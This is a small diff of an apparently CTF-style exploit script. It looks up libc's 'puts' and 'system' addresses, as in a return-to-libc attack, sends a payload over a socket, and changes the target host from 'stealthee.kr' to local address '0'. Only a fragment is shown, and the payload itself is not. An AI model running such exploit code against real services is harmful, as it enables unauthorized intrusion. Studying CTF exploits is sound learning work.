@@ -28,7 +28,7 @@ e = ELF('/lib/i386-linux-gnu/libc.so.6')
 puts_ = e.symbols['puts']
 system_ = e.symbols['system']
 
-s = connect("stealthee.kr", 7777)
+s = connect("0", 7777)
 
 print s.recv()
 s.send(payload)
